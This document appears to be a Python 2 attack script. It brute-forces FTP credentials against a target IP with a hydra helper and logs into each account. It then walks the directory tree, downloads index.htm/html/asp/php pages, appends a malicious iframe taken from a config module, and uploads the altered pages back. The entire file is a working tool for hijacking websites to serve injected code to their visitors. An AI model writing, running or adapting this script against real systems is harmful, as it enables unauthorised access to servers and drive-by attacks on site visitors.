#!/usr/bin/env python

import subprocess
import multiprocessing
from multiprocessing import *
import os
import sys
import re
import reconf
from reconf import *
import time
from functools import wraps
import argparse
import ipaddr
import nmapxml
from nmapxml import *
import ftputil

RED = '\033[1;31m[#]\033[0;m'
GREEN = '\033[1;32m[*]\033[0;m'
YELLOW = '\033[1;33m[!]\033[0;m'
BLUE = '\033[1;34m[+]\033[0;m'
PURPLE = '\033[1;35m[+]\033[0;m'
CYAN = '\033[1;36m[+]\033[0;m'
WHITE = '\033[1;37m[*]\033[0;m'

parser = argparse.ArgumentParser(description='Scan for FTP websites using creds discovered with hydra, search for index files append malicous code into it, then upload it back')
parser.add_argument('-ip', action='store', required=True, help='IP Address to be assessed')

args = parser.parse_args()
try:
        ip_address = ipaddr.IPAddress(args.ip)
except:
        print "%s %s is not correct. Try again..." % (RED, ip_address)
        sys.exit()

ip_address = str(ip_address)

def ftpLogin(ip_address, u, p):
        try:
                ftp = ftputil.FTPHost(ip_address, u, p)
                print "%s FTP to %s using %s/%s is Permitted" % (GREEN, ip_address, u, p)
                return(ftp)
        except OSError as error:
                print "%s FTP to %s using creds %s:%s is not allowed" % (RED, ip_address, u, p)
                pass 
		return

def injectPage(fname):
	try:
		print "%s Inserting code into %s" % (RED, fname)
		f = open(("%s" % fname), 'a')
    		f.write(reconf.iframe1)	
		f.close()
	finally:
		pass

fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
try:
	with open(fnmap) as ft:
		print "%s Checking if %s exists" % (GREEN, fnmap)
except:
	print "%s %s doesn't exists, running brute force to find creds" % (YELLOW, fnmap)
	BRUTEUS = "./brutepwd.py -ip %s -s ftp -hy" % ip_address
	try:
		if os.path.isfile('hydra.restore'):
			os.remove('hydra.restore')		
		subprocess.call(BRUTEUS, shell=True)
	except subprocess.CalledProcessError:
		pass
	except OSError:
		pass
finally:
	print "%s Brute force of %s is completed." % (GREEN, ip_address)
	pass
	
try:
	fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
	fwname = "%s/%s_ftp_results.txt" % (reconf.rsltpth, ip_address)
	print "%s Parsing %s for creds" % (GREEN, fnmap)
	seenusrpwd = set() 
	seenfname = set()
	with open(fnmap, 'r') as searchfile:
		fw = open(fwname, 'w')
		for line in searchfile:
			if 'login:' in line and 'password:' in line:
				u = re.split('\s+', line)[4].strip()
				p = re.split('\s+', line)[6].strip()
				usrpwd = "%s:%s" % (u, p)
				if usrpwd not in seenusrpwd:	
					print "%s Using %s creds to FTP into %s" % (GREEN, usrpwd, ip_address)
					seenusrpwd.add(usrpwd)
					ftp = ftpLogin(ip_address, u, p)
					try:
						fw.write(("Creds: %s\n" % usrpwd))
						recursive = ftp.walk("/",topdown=True,onerror=None)
						for root,dirs,files in recursive:
							for dlst in dirs:
								print "%s Discovered the following directory %s" % (GREEN, dlst) 
								fw.write(("Directory: %s\n" % (dlst)))
							for fname in files:
								print "%s Discovered the following file %s in %s directory" % (GREEN, fname, root)
								fw.write(("File: %s/%s\n" % (root, fname)))
								if re.search(r'^(index)[.](htm|html|asp|php)', fname):
									print "%s Found default page %s at %s" % (YELLOW, fname, root)
									try:

										if fname not in seenfname:
											seenfname.add(fname)
											print "%s Downloading %s with U %s P %s" % (YELLOW, fname, u, p)
											fw.write("Downloaded %s\n" % fname)
											ftp.download(("%s/%s" % (root, fname)), fname)
											injectPage(fname)
											fw.write(("Injected following code %s into %s\n" % (reconf.iframe1, fname)))
											try:
												print "%s Uploading %s back to %s in %s" % (YELLOW, fname, ip_address, root)
												fw.write(("Uploaded %s was successful.\n" % fname))
												ftp.upload_if_newer(fname, ("%s/%s" % (root, fname)))
											except:
												print "%s Could not upload %s back to %s in %s" % (RED, fname, ip_address, root)
												fw.write(("Uploading of %s was not completed using %s.\n" % (fname, usrpwd)))
									except:
										pass
					except:
						pass
except: 
	pass
finally:
	print "%s Assessment Complete." % GREEN
	fw.close()
